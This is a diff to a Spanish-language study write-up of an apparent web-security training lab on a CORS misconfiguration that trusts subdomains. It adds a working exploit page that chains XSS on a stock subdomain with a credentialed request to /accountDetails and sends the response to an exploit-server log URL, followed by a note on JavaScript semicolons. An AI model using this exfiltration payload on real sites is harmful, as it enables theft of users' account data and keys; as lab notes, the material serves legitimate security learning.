@@ -169,8 +169,26 @@ En este lab al entrar en la cuenta vuelbe a  jalar los datos de accountDetails m
 nos damos cuenta que tiene la cabecera de Access-Controls-Allow-Credentials lo que signnifica que el servidor usa CORS para verificar los origenes.
 Para rpobar la vulnerabilidad en el reapeter ponemos el origen en la peticion ponemos null ponemos un dominio ejemplo y nos damos cuenta que no se ve 
 reflejado por lo tanto probamos con subdominios.
-***
+
 En este caso la respuesta se ve reflejada cuando se usa un dominio no al final si no al inciio de este tipo ***"ramdom.urloriginal.net"***
 cuando se envia la peticion esta es exitosa
 
-
+```
+<html>
+<body>
+<script>
+document.location="http://stock.0aed00de042f4714c29a338c00d20097.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0aed00de042f4714c29a338c00d20097.web-security-academy.net';xhr.onreadystatechange = function() {if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0a6a000404cb4797c25633cf01980054.web-security-academy.net/log?key=' %2b xhr.responseText)};};xhr.open('GET',url%2b'/accountDetails', true);xhr.withCredentials=true;xhr.send(null);%3c/script>&storeId=3"
+</script>
+</body>
+</html>
+	
+```
+	
+	
+En este laboratorio aprendi que para que JS sepa que es el fin de una intruccion y el inicio de otra se usa el punto y coma que no es obligatorio
+ya que se supone que JS lo hace automaticamente pero que si bien en este tipo de payloads es completmante necesario ya que no hay saltos de linea. como ejemplo:
+	
+```
+console.log("Primero");console.log("Segundo");var a =1;	
+```
+Esto es perfectamente valido lo puedes probar en la consola	
